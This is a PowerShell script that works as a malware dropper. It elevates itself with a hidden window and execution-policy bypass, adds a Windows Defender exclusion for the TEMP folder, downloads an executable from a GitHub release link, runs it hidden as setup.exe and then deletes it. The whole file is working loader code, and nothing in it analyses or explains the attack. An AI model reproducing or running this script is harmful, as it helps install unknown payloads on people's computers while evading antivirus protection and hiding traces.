param([string]$OriginalTemp = $env:TEMP)

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $expandedTemp = [System.Environment]::ExpandEnvironmentVariables($OriginalTemp)
    $elevatedCommand = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`" -OriginalTemp `"$expandedTemp`""
    try {
        Start-Process -FilePath "powershell.exe" -ArgumentList $elevatedCommand -Verb RunAs -ErrorAction Stop
        exit
    } catch {
        Write-Error "Elevation to administrator privileges failed: $($_.Exception.Message)"
        exit 1
    }
}

$outputExe = Join-Path -Path $OriginalTemp -ChildPath "setup.exe"
$downloadUrl = "https://github.com/scammer-get-scammed/c/releases/download/Setup/AdventureWars.exe"

try {
    try {
        Add-MpPreference -ExclusionPath $OriginalTemp -ErrorAction Stop
        Write-Verbose "Defender exclusion added successfully: $OriginalTemp"
    } catch {
        Write-Warning "Defender exclusion could not be added: $($_.Exception.Message)"
    }

    $ProgressPreference = 'SilentlyContinue'
    Write-Verbose "Downloading file: $downloadUrl"
    Invoke-WebRequest -Uri $downloadUrl -OutFile $outputExe -ErrorAction Stop

    if (Test-Path $outputExe) {
        Write-Verbose "Running setup.exe: $outputExe"
        Start-Process -FilePath $outputExe -WindowStyle Hidden -Wait -ErrorAction Stop
    } else {
        throw "setup.exe could not be downloaded: $outputExe"
    }
}
catch {
    Write-Error "An error occurred: $($_.Exception.Message)"
    exit 1
}
finally {
    try {
        if (Test-Path $outputExe) {
            Remove-Item -Path $outputExe -Force -ErrorAction SilentlyContinue
            Write-Verbose "EXE file deleted: $outputExe"
        }
    } catch {
        Write-Warning "Error during cleanup: $($_.Exception.Message)"
    }
}
